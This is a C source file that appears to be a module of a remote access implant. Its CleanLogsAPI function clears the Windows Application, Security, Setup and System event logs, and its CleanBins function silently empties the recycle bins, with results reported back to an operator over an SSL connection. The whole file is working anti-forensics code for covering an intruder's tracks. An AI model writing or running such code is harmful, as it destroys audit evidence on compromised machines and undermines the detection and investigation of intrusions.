#include "Variables.h"

int CleanLogsAPI(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] Logs cleaned successfully!\033[0m\n";
	char Error[] = "\033[1;31m[-] Can't clean all logs.\033[0m\n";
	char NotAdmin[] = "\033[1;31m[-] You don't have admin privs.\033[0m\n";
	char Logs[4][16] = {"Application", "Security", "Setup", "System"};

	for (int i = 0; i < 4; i++)
	{
		HANDLE EventLog;
		EventLog = OpenEventLogA(NULL, Logs[i]);

		if (EventLog == NULL)
		{
			if (i == 0)
			{
				SSL_write(ssl, NotAdmin, strlen(NotAdmin));
				return EXIT_FAILURE;
			}
			else
			{
				SSL_write(ssl, Error, sizeof(Error));
				return EXIT_FAILURE;
			}
		}

		int clear = ClearEventLogA(EventLog, NULL);
		if (clear == 0)
		{
			SSL_write(ssl, Error, sizeof(Error));
			return EXIT_FAILURE;
		}

		int close = CloseEventLog(EventLog);
		if (close == 0)
		{
			SSL_write(ssl, Error, sizeof(Error));
			return EXIT_FAILURE;
		}
	}

	SSL_write(ssl, Success, sizeof(Success));
	return EXIT_SUCCESS;
}

int CleanBins(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] Cleaned bins!\033[0m\n";
	char Error[] = "\033[1;31m[-] Recycle bins are already empty\033[0m\n";

	HRESULT Cleaned;
	Cleaned = SHEmptyRecycleBinA(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
	if (Cleaned != S_OK)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return EXIT_FAILURE;
	}
	SSL_write(ssl, Success, sizeof(Success));
	return EXIT_SUCCESS;
}
